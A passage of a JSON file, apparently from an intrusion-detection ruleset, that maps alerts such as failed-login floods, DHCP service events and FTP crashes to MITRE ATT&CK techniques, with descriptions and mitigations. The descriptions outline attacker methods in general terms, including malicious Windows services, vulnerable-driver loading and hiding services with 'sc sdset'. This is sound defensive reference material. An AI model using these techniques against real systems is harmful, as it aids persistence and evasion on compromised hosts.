            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 6363,
        "rule_description": "MS-DHCP: Audit log paused.",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 6373,
        "rule_description": "MS-DHCP: Service not authorized in AD.",
        "mitre_id": [
            "T1569.002"
        ],
        "possible_attacks": [
            "Service Execution"
        ],
        "description": [
            "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](\n\n[PsExec]( can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as [PsExec]( and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service]( during service persistence or privilege escalation."
        ],
        "mitigation_strategies": [
            "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level."
        ]
    },
    {
        "rule_id": 6374,
        "rule_description": "MS-DHCP: Service authorized in AD.",
        "mitre_id": [
            "T1543.003"
        ],
        "possible_attacks": [
            "Windows Service"
        ],
        "description": [
            "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API]( functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry]( or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as [Rootkit]( to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service]( (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts]( for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. "
        ]
    },
    {
        "rule_id": 6376,
        "rule_description": "MS-DHCP: Service has not determined if it is authorized in AD.",
        "mitre_id": [
            "T1569.002"
        ],
        "possible_attacks": [
            "Service Execution"
        ],
        "description": [
            "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](\n\n[PsExec]( can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as [PsExec]( and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service]( during service persistence or privilege escalation."
        ],
        "mitigation_strategies": [
            "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level."
        ]
    },
    {
        "rule_id": 7209,
        "rule_description": "Arpwatch: Possible arpspoofing attempt.",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 9351,
        "rule_description": "Horde brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 9352,
        "rule_description": "Multiple Horde emergency messages.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 9403,
        "rule_description": "Roundcube brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 9505,
        "rule_description": "Wordpress Comment Flood Attempt.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 9551,
        "rule_description": "Multiple wordpress authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 9611,
        "rule_description": "cimserver: Compaq Insight Manager stopped.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 9750,
        "rule_description": "Dovecot Multiple Authentication Failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 9751,
        "rule_description": "Dovecot brute force attack (multiple auth failures).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 9820,
        "rule_description": "vm-pop3d: POP3 brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 9951,
        "rule_description": "vpopmail: brute force (multiple failed logins).",
        "mitre_id": [
            "T1110",
            "T1114"
        ],
        "possible_attacks": [
            "Brute Force",
            "Email Collection"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 9952,
        "rule_description": "vpopmail: brute force (email harvesting).",
        "mitre_id": [
            "T1110",
            "T1114"
        ],
        "possible_attacks": [
            "Brute Force",
            "Email Collection"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 9953,
        "rule_description": "vpopmail: brute force (empty password).",
        "mitre_id": [
            "T1110",
            "T1114"
        ],
        "possible_attacks": [
            "Brute Force",
            "Email Collection"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 11107,
        "rule_description": "FTPD: Connection blocked by Tcp Wrappers.",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 11109,
        "rule_description": "FTPD: Multiple FTP failed login attempts.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11111,
        "rule_description": "FTPD: Attempt to login with disabled account.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11207,
        "rule_description": "ProFTPD: Connection refused by TCP Wrappers.",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 11209,
        "rule_description": "ProFTPD: Attempt to bypass firewall that can't adequately keep state of FTP traffic.",
        "mitre_id": [
            "T1071"
        ],
        "possible_attacks": [
            "Application Layer Protocol"
        ],
        "description": [
            "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. "
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."
        ]
    },
    {
        "rule_id": 11210,
        "rule_description": "ProFTPD: Multiple failed login attempts.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 11218,
        "rule_description": "ProFTPD: FTP process crashed.",
        "mitre_id": [
            "T1210"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services"
        ],
        "description": [
            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well."
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services."
        ]
    },
    {
        "rule_id": 11219,
        "rule_description": "ProFTPD: FTP server Buffer overflow attempt.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
